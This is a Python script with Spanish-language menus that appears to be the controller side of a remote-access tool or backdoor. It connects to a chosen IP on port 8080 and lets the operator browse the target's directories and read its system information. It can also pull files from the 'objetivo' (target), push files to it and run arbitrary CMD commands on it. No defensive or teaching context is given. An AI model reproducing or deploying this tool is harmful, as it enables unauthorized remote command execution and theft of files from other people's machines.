#!/usr/bin/env python
# coding: utf-8

import socket as soc
import threading as th
import sys
from time import sleep

    
def linea_comandos(client):
    print('1-Obtener directorio actual')
    print('2-Listado de directorios')
    print('3-Seleccionar directorio')
    print('4-Cerrar comunicacion')
    print('5-Informacion del sistema')
    print('6-Descargar archivo')
    print('7-Enviar archivo')
    print('8-Comandos CMD')
    while  True :
        valor=int(input('[*] Seleccina [*] :__'))
        if valor==1:
            valor='1'
            #Obtener directorio actual
            client.send(valor.encode())
            request=''
            request=client.recv(1024)
            print(request)
            client.close()
            break
        elif valor==2:
            valor='2'
            client.send(valor.encode())
            request=''
            request=client.recv(1024)
            print(request)
            client.close()
            break
        elif valor==3:
            valor='3'
            client.send(valor.encode())
            request=client.recv(1024)
            if request.decode()=='OK':
                directorio=input('Directorio:__')
                client.send(directorio.encode())
                request=client.recv(1024) 
                print(request.decode())
                client.close()
                break
            else:pass
            
        elif valor==4:
            valor='4'
            client.send(valor.encode())
            print('Coneccion cerrada')
            client.close()
            break
   
        elif valor==5:
            valor='5'
            client.send(valor.encode())
            request=client.recv(1024)
            print(request)
            client.close()
            break
            
        elif valor==6:
            valor='6'
            client.send(valor.encode())
            request=client.recv(1024)
            if request.decode()=='OK':
                nombre=input('Nombre del archivo:__')
                ruta='C:/Users/MBI/Documents/Python_Scripts/'+nombre
                direccion=input('Direccion de objetivo:__')
                client.send(direccion.encode())
                with open(ruta,'wb') as fname:
                    request=client.recv(10096)
                    while request:
                        fname.write(request)
                        request=client.recv(10096)
                  
                    fname.close()
                    client.close()
                    break
                       
                    
                    
                     
                    
        elif valor==7:
            valor='7'
            client.send(valor.encode())
            request=client.recv(1024)
            if request.decode()=='OK':
                nombre=input('Nombre del archivo:__')
                client.send(nombre.encode())
                direccion=input('Direccion del archivo:__')
                with open(direccion,'rb') as fname:
                    client.sendfile(fname)
                    fname.close()
                    print('Archivo enviado')
                    client.close()
                    break
                    
        elif valor==8:
           valor='8'
           client.send(valor.encode())
           request=client.recv(1024)
           if request.decode()=='OK': 
               cmd=input('CMD:>')
               client.send(cmd.encode())
               request=client.recv(1024)
               print(request)
               client.close()
               break
           else:
               pass
                    
        
    return 0



# Main()
port=8080
ip=input('IP:__')
while True:
    ipx=ip
    global client
    try:
        client=soc.socket(soc.AF_INET,soc.SOCK_STREAM)
        client.setsockopt(soc.SOL_SOCKET,soc.SO_REUSEADDR,1)
        client.connect((ipx,port))
        comand=client.recv(1024)
    except:
         sys.exit()
    if comand.decode() =='ACK':
        linea_comandos(client)
        salir=input('Salir y/n:__')
        print('\n')
        if salir=='y':
            break
        else:pass
    else:
        print(comand.decode())
        sys.exit()
sys.exit()
